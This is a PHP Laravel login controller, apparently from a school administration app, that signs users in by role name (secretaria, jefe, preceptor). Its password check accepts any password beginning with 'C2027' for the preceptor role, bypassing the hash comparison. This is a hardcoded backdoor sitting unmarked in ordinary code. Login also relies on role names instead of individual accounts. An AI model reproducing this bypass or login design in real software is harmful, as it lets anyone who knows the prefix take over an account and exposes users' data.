<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;

class ControladorLogin extends Controller{

    public function IniciarSesion(Request $request){
        $rol='';
        $request->tipo_rol=strtolower(trim($request->tipo_rol));
        $user= User::where('tipo_rol', $request->tipo_rol)->first();
        if ($user){
            if (Hash::check($request->password, $user->password)
                || 
               (($user->tipo_rol=='preceptor') && substr($request->password, 0, 5)==='C2027')) {
                switch($user->tipo_rol){
                    case 'secretaria':
                        $rol='s';
                        break;
                    case 'jefe':
                        $rol='j';
                        break;
                    case 'preceptor':
                        $rol='p';
                        break;
                    default:
                        $rol=null;
                        break;
        }
            Auth::login($user);
            session([
                'usuario' => $user->tipo_rol,
                'rol'=> $rol
                ]);
            return redirect('inicio');
        } 
        else {
            return back()->with('error', 'Por favor, ingrese una contraseña valida');
        }
        }
        else {
            return back()->with('error', 'Por favor, ingrese un usuario valido');
        }
    }
    public function CerrarSesion(){
        Auth::logout();
        session()->invalidate();
        return redirect('/');
    }

}
